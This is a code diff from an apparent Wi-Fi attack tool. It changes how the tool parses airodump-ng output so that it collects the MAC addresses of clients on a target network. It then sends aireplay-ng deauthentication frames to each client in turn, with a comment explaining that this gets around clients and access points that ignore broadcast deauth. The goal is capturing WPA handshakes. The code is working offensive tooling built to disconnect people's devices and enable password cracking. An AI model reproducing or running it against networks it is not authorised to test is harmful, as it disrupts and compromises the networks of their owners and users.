@@ -18,22 +18,22 @@ def _safe(name):
     return re.sub(r"[^A-Za-z0-9_-]", "_", (name or "unknown"))[:24]
 
 
-def _count_clients(csv_path, bssid):
-    """Count stations associated with `bssid` in airodump's live -01.csv."""
+def _clients(csv_path, bssid):
+    """Station MACs associated with `bssid` in airodump's live -01.csv."""
     try:
         with open(csv_path, encoding="utf-8", errors="ignore") as f:
             text = f.read()
     except OSError:
-        return None
+        return []
     idx = text.find("Station MAC")          # second section = associated clients
     if idx < 0:
-        return 0
-    count = 0
+        return []
+    macs = []
     for line in text[idx:].splitlines()[1:]:
         parts = [p.strip() for p in line.split(",")]
         if len(parts) > 5 and parts[5].upper() == bssid.upper():
-            count += 1
-    return count
+            macs.append(parts[0])
+    return macs
 
 
 def _has_handshake(cap_path, bssid):
@@ -104,16 +104,31 @@ def capture(mon, target, req, emit, stop_flag):
                                  detail="timeout"))
                 return {"ok": False, "essid": essid, "bssid": bssid}
 
+            clients = _clients(csv, bssid)
             if deauth_on and deauth_gap and (time.time() - last_deauth) >= deauth_gap:
-                tools.run([tools.AIREPLAY, "--deauth", str(num_deauth),
-                           "-a", bssid, mon], timeout=8)
+                # Target known clients directly (-c) — broadcast deauth (no -c)
+                # is ignored by many modern clients/APs and by anything with
+                # management-frame protection. Fall back to broadcast only
+                # when no station has shown up yet.
+                targets = clients or [None]
+                for client in targets:
+                    cmd = [tools.AIREPLAY, "--ignore-negative-one",
+                           "--deauth", str(num_deauth), "-a", bssid]
+                    if client:
+                        cmd += ["-c", client]
+                    cmd.append(mon)
+                    res = tools.run(cmd, timeout=8)
+                    if res:
+                        tools.log("deauth %s -> %s: %s" % (
+                            bssid, client or "broadcast",
+                            ((res.stdout or "") + (res.stderr or "")).strip()[-200:]))
                 last_deauth = time.time()
                 emit(AttackEvent(EventType.DEAUTH, essid=essid, bssid=bssid,
                                  current=num_deauth))
 
             emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                              phase="HS", countdown=remaining, cd_max=timeout,
-                             signal=signal, clients=_count_clients(csv, bssid)))
+                             signal=signal, clients=len(clients)))
 
             if _has_handshake(cap, bssid):
                 emit(AttackEvent(EventType.HANDSHAKE, essid=essid, bssid=bssid))
